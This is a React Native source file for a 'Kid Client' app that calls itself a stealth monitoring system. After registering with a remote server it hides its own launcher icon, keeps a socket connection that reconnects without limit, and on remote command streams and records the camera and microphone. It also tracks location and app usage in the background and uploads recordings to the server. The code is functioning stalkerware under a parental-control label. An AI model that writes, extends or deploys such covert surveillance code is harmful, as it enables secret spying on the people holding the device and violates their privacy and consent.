import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, Button, TextInput, ScrollView, ActivityIndicator, NativeModules, Platform } from 'react-native';
import { requestAllPermissions } from './app/services/permissions';
import { CameraService } from './app/services/CameraService';
import { MicrophoneService } from './app/services/MicrophoneService';
import { LocationService } from './app/services/LocationService';
import { VisibilityService } from './app/services/VisibilityService';
import { AppUsageService } from './app/services/AppUsageService';
import { io } from 'socket.io-client';

const BACKEND_URL = 'http://localhost:8443';

export default function App() {
  const [serverUrl, setServerUrl] = useState('http://192.168.1.24:8443');
  const [parentId, setParentId] = useState('');
  const [deviceId, setDeviceId] = useState('device_123'); // Default identifier
  const [deviceName, setDeviceName] = useState("John's Android");
  const [statusMsg, setStatusMsg] = useState('Configuration Mode');
  const [registered, setRegistered] = useState(false);
  const [loading, setLoading] = useState(false);
  
  // Service instances
  const [services, setServices] = useState({
    camera: null,
    mic: null,
    location: null,
    usage: null
  });

  const registerDevice = async () => {
    if (!parentId || !deviceId) {
      setStatusMsg('Please provide Parent ID and Device ID');
      return;
    }

    setLoading(true);
    setStatusMsg('Checking permissions & registering device...');

    try {
      // Step 1: Check and request all hardware permissions
      const permResult = await requestAllPermissions();
      if (!permResult.allGranted) {
        setStatusMsg('Error: Camera, Mic & GPS permissions are required');
        setLoading(false);
        return;
      }

      // Step 1b: Check and request Apps with Usage Access permission on Android
      if (Platform.OS === 'android' && NativeModules.UsageStatsModule) {
        try {
          const usageGranted = await NativeModules.UsageStatsModule.checkUsagePermission();
          if (!usageGranted) {
            setStatusMsg('Please grant "Apps with Usage Access" permission in settings and try again.');
            await NativeModules.UsageStatsModule.openUsageSettings();
            setLoading(false);
            return;
          }
        } catch (err) {
          console.warn('Usage permission check error:', err.message);
        }
      }

      const activeServer = serverUrl.trim().replace(/\/+$/, '');

      // Step 2: Register device via REST API
      const response = await fetch(`${activeServer}/api/auth/kid/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          parentId,
          deviceId,
          name: deviceName,
          age: 12,
          model: 'Samsung Galaxy S22',
          os: 'Android',
          osVersion: '13.0'
        })
      });

      const resData = await response.json();
      if (!response.ok) {
        throw new Error(resData.error || 'Failed to register with parent server');
      }

      // Step 3: Trigger App Hiding
      await VisibilityService.hideAppIcon();

      // Step 4: Establish Socket connection with persistent auto-reconnect
      const socket = io(activeServer, {
        auth: { deviceId },
        reconnection: true,
        reconnectionAttempts: Infinity,
        reconnectionDelay: 1000,
        transports: ['websocket', 'polling']
      });

      socket.on('connect', () => {
        setStatusMsg('Secure Connection Established. Stealth background monitoring activated.');
      });

      // Initialize background services
      const camSvc = new CameraService(deviceId, socket);
      const micSvc = new MicrophoneService(deviceId, socket);
      const locSvc = new LocationService(deviceId, socket);
      const usageSvc = new AppUsageService(deviceId, socket, activeServer);

      // Start Background location watch & app usage polling
      await locSvc.startTracking();
      usageSvc.startMonitoring(15000);

      // Register socket commands listener
      socket.on('camera-start-command', async (data) => {
        console.log('Received Camera Start command via socket.');
        await camSvc.startStream(data.streamId, data.parentSocketId);
      });

      socket.on('camera-switch-command', (data) => {
        console.log(`Received Camera Switch command to ${data.facing}`);
        camSvc.setFacing(data.facing);
      });

      socket.on('camera-stop-command', async () => {
        console.log('Received Camera Stop command.');
        await camSvc.stopStream();
      });

      socket.on('camera-record-start', async () => {
        await camSvc.startRecording();
      });

      socket.on('camera-record-stop', async () => {
        const recordData = await camSvc.stopRecording();
        if (recordData) {
          fetch(`${activeServer}/api/surveillance/camera/record/stop`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(recordData)
          });
        }
      });

      socket.on('mic-start-command', async (data) => {
        await micSvc.startStream(data.streamId);
      });

      socket.on('mic-stop-command', async () => {
        await micSvc.stopStream();
      });

      socket.on('mic-record-start', async () => {
        await micSvc.startRecording();
      });

      socket.on('mic-record-stop', async () => {
        const audioData = await micSvc.stopRecording();
        if (audioData) {
          fetch(`${activeServer}/api/surveillance/mic/record/stop`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(audioData)
          });
        }
      });

      socket.on('app-hide-command', async () => {
        await VisibilityService.hideAppIcon();
      });

      socket.on('app-show-command', async () => {
        await VisibilityService.showAppIcon();
      });

      setServices({ camera: camSvc, mic: micSvc, location: locSvc, usage: usageSvc });
      setRegistered(true);
    } catch (e) {
      console.error(e);
      setStatusMsg(`Registration Error: ${e.message}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <ScrollView contentContainerStyle={styles.container}>
      <Text style={styles.title}>CropCure Kid Client Setup</Text>
      <Text style={styles.subtitle}>Administrative Stealth Monitoring System</Text>
      
      <View style={styles.statusBox}>
        <Text style={styles.statusLabel}>Status Dashboard</Text>
        <Text style={styles.statusValue}>{statusMsg}</Text>
      </View>

      {!registered ? (
        <View style={styles.form}>
          <Text style={styles.label}>Server URL (Backend Host)</Text>
          <TextInput 
            style={styles.input} 
            value={serverUrl} 
            onChangeText={setServerUrl} 
            placeholder="http://192.168.1.24:8443"
            placeholderTextColor="#6c6489"
          />

          <Text style={styles.label}>Parent ID / Linking Code</Text>
          <TextInput 
            style={styles.input} 
            value={parentId} 
            onChangeText={setParentId} 
            placeholder="Enter Parent MongoDB ID"
            placeholderTextColor="#6c6489"
          />

          <Text style={styles.label}>Device Unique ID</Text>
          <TextInput 
            style={styles.input} 
            value={deviceId} 
            onChangeText={setDeviceId} 
            placeholder="device_123"
            placeholderTextColor="#6c6489"
          />

          <Text style={styles.label}>Device Display Name</Text>
          <TextInput 
            style={styles.input} 
            value={deviceName} 
            onChangeText={setDeviceName} 
            placeholder="John's Android"
            placeholderTextColor="#6c6489"
          />

          {loading ? (
            <ActivityIndicator size="large" color="#00f2fe" style={{ marginTop: 20 }} />
          ) : (
            <Button title="Link & Hide Application" color="#9b51e0" onPress={registerDevice} />
          )}
        </View>
      ) : (
        <View style={styles.registeredBox}>
          <Text style={{ color: '#00ff87', fontWeight: 'bold', fontSize: 16, textAlign: 'center' }}>
            ✓ Device Configured successfully
          </Text>
          <Text style={{ color: '#a39bb8', textAlign: 'center', marginTop: 10 }}>
            The launcher icon is now disabled. Monitoring will continue silently in the background. Press Home to return to the Android screen.
          </Text>
        </View>
      )}
    </ScrollView>
  );
}

const styles = StyleSheet.create({
  container: {
    padding: 30,
    backgroundColor: '#0a051b',
    minHeight: '100%'
  },
  title: {
    fontSize: 24,
    fontWeight: 'bold',
    color: '#fff',
    textAlign: 'center',
    marginTop: 40
  },
  subtitle: {
    fontSize: 12,
    color: '#00f2fe',
    textAlign: 'center',
    marginTop: 5,
    textTransform: 'uppercase',
    letterSpacing: 1
  },
  statusBox: {
    backgroundColor: 'rgba(255,255,255,0.03)',
    borderWidth: 1,
    borderColor: 'rgba(255,255,255,0.08)',
    borderRadius: 12,
    padding: 16,
    marginVertical: 24
  },
  statusLabel: {
    color: '#a39bb8',
    fontSize: 11,
    textTransform: 'uppercase'
  },
  statusValue: {
    color: '#ff007f',
    fontSize: 15,
    fontWeight: 'bold',
    marginTop: 4
  },
  form: {
    gap: 15
  },
  label: {
    color: '#a39bb8',
    fontSize: 13,
    marginBottom: 4
  },
  input: {
    backgroundColor: 'rgba(255,255,255,0.05)',
    borderWidth: 1,
    borderColor: 'rgba(255,255,255,0.08)',
    borderRadius: 8,
    padding: 12,
    color: '#fff',
    fontSize: 14
  },
  registeredBox: {
    backgroundColor: 'rgba(0, 255, 135, 0.05)',
    borderColor: '#00ff87',
    borderWidth: 1,
    padding: 20,
    borderRadius: 12,
    marginTop: 20
  }
});
